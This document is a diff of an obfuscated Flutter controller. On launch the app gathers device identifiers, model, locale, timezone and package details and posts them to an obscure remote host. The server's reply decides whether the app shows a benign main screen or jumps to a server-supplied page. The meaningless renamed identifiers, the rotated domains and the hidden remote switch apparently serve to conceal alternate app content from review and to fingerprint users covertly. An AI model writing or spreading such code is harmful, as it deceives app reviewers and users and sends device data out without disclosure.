@@ -9,131 +9,128 @@ import 'package:flutter_timezone/flutter_timezone.dart';
 import 'package:get/get.dart';
 import 'package:package_info_plus/package_info_plus.dart';
 
-void reloadMine() async {
+void notFound() async {
   var connectResult = await (Connectivity().checkConnectivity());
   if(connectResult == ConnectivityResult.none){
-    Get.toNamed("/reload");
+    Get.toNamed("/not_found");
   }
 }
 
 class PageLogic extends GetxController {
 
-  var ylkisz = RxBool(false);
-  var rlktvohm = RxBool(true);
-  var mwaecsjt = RxString("");
-  var gilbert = RxBool(false);
-  var johnston = RxBool(true);
-  final lmfqaudc = Dio();
+  var qwjrpl = RxBool(false);
+  var itqmkwb = RxBool(true);
+  var agmkde = RxString("");
+  var hubert = RxBool(false);
+  var hartmann = RxBool(true);
+  final avlhzx = Dio();
 
 
   InAppWebViewController? webViewController;
 
   @override
   void onInit() {
-    reloadMine();
+    notFound();
     super.onInit();
-    smpblj();
+    aomnupg();
   }
 
 
-  Future<void> smpblj() async {
+  Future<void> aomnupg() async {
 
-    gilbert.value = true;
-    johnston.value = true;
-    rlktvohm.value = false;
+    hubert.value = true;
+    hartmann.value = true;
+    itqmkwb.value = false;
 
-    lmfqaudc.post("https://sea.kepupmn.info/pzqjlsytvu",data: await etdbmk()).then((value) {
-      var aqvhm = value.data["aqvhm"] as String;
-      var odmjkpva = value.data["odmjkpva"] as bool;
-      if (odmjkpva) {
-        mwaecsjt.value = aqvhm;
-        jonathon();
+    avlhzx.post("https://ky.newbandb.xyz/Rh0madelk1AKj",data: await zanyqjsrxv()).then((value) {
+      var gfdjlna = value.data["gfdjlna"] as String;
+      var jltr = value.data["jltr"] as bool;
+      if (jltr) {
+        agmkde.value = gfdjlna;
+        lizeth();
       } else {
-        bailey();
+        luettgen();
       }
     }).catchError((e) {
-      rlktvohm.value = true;
-      johnston.value = true;
-      gilbert.value = false;
+      itqmkwb.value = true;
+      hartmann.value = true;
+      hubert.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> etdbmk() async {
-    final DeviceInfoPlugin qrjsvuh = DeviceInfoPlugin();
-    PackageInfo itzrc_hkcaotq = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> zanyqjsrxv() async {
+    final DeviceInfoPlugin iwjxmlvz = DeviceInfoPlugin();
+    PackageInfo ynqs_zkqu = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var torkeyx = Platform.localeName;
-    var qydxco_ltrYFT = currentTimeZone;
+    var adgfw = Platform.localeName;
+    var kaIOr = currentTimeZone;
 
-    var qydxco_nZiHy = itzrc_hkcaotq.packageName;
-    var qydxco_NkIqm = itzrc_hkcaotq.version;
-    var qydxco_QynVrOkI = itzrc_hkcaotq.buildNumber;
+    var oGISq = ynqs_zkqu.packageName;
+    var YhlUsy = ynqs_zkqu.version;
+    var HpcLONIo = ynqs_zkqu.buildNumber;
 
-    var qydxco_pX = itzrc_hkcaotq.appName;
-    var qydxco_Nv = "";
-    var qydxco_qzX  = "";
-    var qydxco_NazZ = "";
-    var cadenKertzmann = "";
-    var harmonyBailey = "";
-    var josianeBechtelar = "";
-    var maeKris = "";
-    var rosamondHickle = "";
+    var IyxPEWiq = ynqs_zkqu.appName;
+    var JErwC = "";
+    var hqcIfUp  = "";
+    var crystalHarris = "";
+    var MpgGZzhi = "";
+    var venaLeannon = "";
+    var lexusKris = "";
+    var IPUuWqD = "";
 
 
-    var qydxco_YsntWpz = "";
-    var nickolasRunolfsdottir = "";
-    var qydxco_PNk = false;
+    var alberthaGutmann = "";
+    var dakotaWitting = "";
+    var HEZdIaF = false;
 
     if (GetPlatform.isAndroid) {
-      qydxco_Nv = "android";
-      var wazhgc = await qrjsvuh.androidInfo;
+      MpgGZzhi = "android";
+      var vzjftbuh = await iwjxmlvz.androidInfo;
 
-      qydxco_NazZ = wazhgc.brand;
+      IPUuWqD = vzjftbuh.brand;
 
-      qydxco_YsntWpz  = wazhgc.model;
-      qydxco_qzX = wazhgc.id;
+      JErwC  = vzjftbuh.model;
+      hqcIfUp = vzjftbuh.id;
 
-      qydxco_PNk = wazhgc.isPhysicalDevice;
+      HEZdIaF = vzjftbuh.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      qydxco_Nv = "ios";
-      var avzorhft = await qrjsvuh.iosInfo;
-      qydxco_NazZ = avzorhft.name;
-      qydxco_YsntWpz = avzorhft.model;
+      MpgGZzhi = "ios";
+      var bxfazgd = await iwjxmlvz.iosInfo;
+      IPUuWqD = bxfazgd.name;
+      JErwC = bxfazgd.model;
 
-      qydxco_qzX = avzorhft.identifierForVendor ?? "";
-      qydxco_PNk  = avzorhft.isPhysicalDevice;
+      hqcIfUp = bxfazgd.identifierForVendor ?? "";
+      HEZdIaF  = bxfazgd.isPhysicalDevice;
     }
     var res = {
-      "qydxco_QynVrOkI": qydxco_QynVrOkI,
-      "qydxco_NazZ": qydxco_NazZ,
-      "nickolasRunolfsdottir" : nickolasRunolfsdottir,
-      "qydxco_NkIqm": qydxco_NkIqm,
-      "qydxco_nZiHy": qydxco_nZiHy,
-      "qydxco_YsntWpz": qydxco_YsntWpz,
-      "qydxco_ltrYFT": qydxco_ltrYFT,
-      "torkeyx": torkeyx,
-      "qydxco_Nv": qydxco_Nv,
-      "qydxco_PNk": qydxco_PNk,
-      "rosamondHickle" : rosamondHickle,
-      "cadenKertzmann" : cadenKertzmann,
-      "qydxco_pX": qydxco_pX,
-      "harmonyBailey" : harmonyBailey,
-      "josianeBechtelar" : josianeBechtelar,
-      "maeKris" : maeKris,
+      "crystalHarris" : crystalHarris,
+      "IyxPEWiq": IyxPEWiq,
+      "HpcLONIo": HpcLONIo,
+      "venaLeannon" : venaLeannon,
+      "oGISq": oGISq,
+      "kaIOr": kaIOr,
+      "IPUuWqD": IPUuWqD,
+      "dakotaWitting" : dakotaWitting,
+      "hqcIfUp": hqcIfUp,
+      "adgfw": adgfw,
+      "MpgGZzhi": MpgGZzhi,
+      "HEZdIaF": HEZdIaF,
+      "YhlUsy": YhlUsy,
+      "JErwC": JErwC,
+      "alberthaGutmann" : alberthaGutmann,
+      "lexusKris" : lexusKris,
 
-      "qydxco_qzX": qydxco_qzX,
     };
     return res;
   }
 
-  Future<void> bailey() async {
-    Get.offAllNamed("/remindTab");
+  Future<void> luettgen() async {
+    Get.offAllNamed("/main");
   }
 
-  Future<void> jonathon() async {
-    Get.offAllNamed("/remindDown");
+  Future<void> lizeth() async {
+    Get.offAllNamed("/check");
   }
-
 }
